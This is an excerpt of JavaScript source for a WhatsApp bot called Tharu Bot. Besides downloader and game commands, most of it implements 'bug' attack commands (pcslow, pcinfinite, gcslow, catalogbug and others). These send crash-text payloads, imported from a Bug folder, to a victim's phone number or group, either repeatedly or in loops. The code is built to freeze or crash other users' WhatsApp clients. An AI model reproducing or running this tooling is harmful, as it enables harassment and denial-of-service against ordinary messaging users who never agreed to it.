...
//warrrrrrrrr
const { xeonvirtex } = require('./Bug/xeonvirtex')
const { xeonbutton } = require('./Bug/xeonbutton')
const { xeonbrutal } = require('./Bug/xeonbrutal')
const { iphone } = require('./Bug/virtex/iphone')
...
let anugas = await fetchJson('https://raw.githubusercontent.com/DGXeon/Media/main/guessSong.json')
...
break
	    case 'ytmp3xx': case 'ytaudioxx': {
                ...
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=Do4Gt3uwewU& 128kbps`
...
break
            case 'ytmp4xx': case 'ytvideoxx': {
                ...
                if (!text) throw `Example : ${prefix + command} https://youtube.com/watch?v=Do4Gt3uwewU& 360p`
...
case 'dare':
    ...
    "say i love the bot owner Rivishan through voice note",
    ...
    "do you love the bot creator, Rivishan?🤣",
...
teks = `*「 ${global.botname} Script 」*\n\nYouTube: ${global.websitex}\nInstagram: ${global.botscript}\n\nමතක ඇතුව අඩුපාඩු කියන්න. 🍜`
let buttons = [
{buttonId: `owner`, buttonText: {displayText: 'Owner 😎'}, type: 1}
]
let buttonMessage = {
image: {url: `https://i.ibb.co/6Hm0sRD/Tharu-Bot-1.jpg`},
jpegThumbnail: log0,
caption: teks,
footer: `${botname}`,
buttons: buttons,
headerType: 4,
contextInfo:{externalAdReply:{
title:"Tharu Bot MD V2 Created By Rivishan",
body: "Click to contact me", 
thumbnail: fs.readFileSync("Media/theme/cheemspic.jpg"),
mediaType:1,
mediaUrl: 'https://i.ibb.co/6Hm0sRD/Tharu-Bot-1.jpg',
sourceUrl: "https://i.ibb.co/S6K3b9Y/Tharu-Bot-2.jpg"
}}
}
XeonBotInc.sendMessage(m.chat, buttonMessage, { quoted: m })
}
...
"title": `Tharu Bot🥰 ${xeonbutton} ${xeonbutton}`,
"description": `Tharu Bot🥰 ${xeonbutton} ${xeonbutton}`,
"currencyCode": "INR",
"footerText": botname,
...
"fileName": `Tharu Bot🥰${xeonbrutal(prefix)}`,
...
case 'pcslow': { 
             ...
             xeonyh1 = { 
                    ...
                    message: { 
                        "imageMessage": { 
                            "mimetype": "image/jpeg", 
                            "caption": `🦄Tharu Bug Bot`,
                            "jpegThumbnail": xpicvirus
                        } 
                    } 
                }
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:xeonyh1})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:xeonyh1})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcmass 91xxxxxxxxxx`)
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:pmgcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pmgcmassxeon})
         ...
         case 'gcslow':               
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcmassxeon})
            await sleep(30000)
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcmassxeon})
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:gcinfinitexeon})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcinfinite 91xxxxxxxxxx`)
            ...
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcinfinitexeon})
...
if (!text) return reply(`${mess.attack}\nExample: ${prefix}pcgcinfinite 91xxxxxxxxxx`)
            ...
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(m.chat, {text:"Tharu Bot🥰"},{quoted:pcgcinfinitexeon})
            await XeonBotInc.sendMessage(`${text}@s.whatsapp.net`, {text:"Tharu Bot🥰"},{quoted:pcgcinfinitexeon})
...
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
kwkwkx = '``🦄Tharu bug bot``',
XeonBotInc.sendMessage(m.chat, {text: kwkwkx, thumbnail: xpicvirus, quoted: m, contextInfo: { externalAdReply:{title: `${xeonvirtex}`,body: 'Tharu Bot🥰',previewType:"PHOTO",thumbnail: xpicvirus,sourceUrl:websitex}}})
}
}
break
case 'pccontact': {
...
case 'catalogbug': {
                ...
                if (!isCreator) return m.reply(`${mess.owner}`)
                if (args.length == 0) return m.reply(`Usage ${prefix+command} amount\nExample ${prefix+command} 5`)
var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./Bug/xpicvirus.png') }, { upload: XeonBotInc.waUploadToServer })
amount = `${encodeURI(q)}`
for (let i = 0; i < amount; i++) {
var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"productMessage": {
...
ydd = `${ownername}`
for (let i = 0; i < amount; i++) {
brutaltarget = fs.readFileSync('./Bug/cumshot.xeon')
...
XeonBotInc.sendText(m.chat, `Tharu Bot🥰`, text, {quoted: unicornXeonxD})
}
}
break
case 'textshot': {
                ...
                user.afkTime = + new Date
                user.afkReason = text
                reply(`${m.pushName} Tharu Bot🥰${text ? ': ' + text : ''}`)
            }
            break
//------------------------The End----------------------\\
...
└┬────────────┈ ⳹
 ...
 break
            ...
            case 'command': {
	const sections = [{
								"title": "❤ Initial Features Of Tharu Bot V2 ❤",
								"rows": [
									{
										"title": "Other ☕",
							...
							},
							{
								...
								"rows": [
									{
										"title": "Thanks To ❤️",
										"description": "💞 Displays The List Of Credit Of The Tharu Bot 💞",
										"rowId": `${prefix}tqtt`
									}
								]
							}
...
const buttons = [
  ...
  {buttonId: 'donate', buttonText: {displayText: 'Contact Me ❤'}, type: 1},
  {buttonId: 'owner', buttonText: {displayText: 'Owner 😎'}, type: 1}
]
const buttonMessage = {
    image: unicorn,
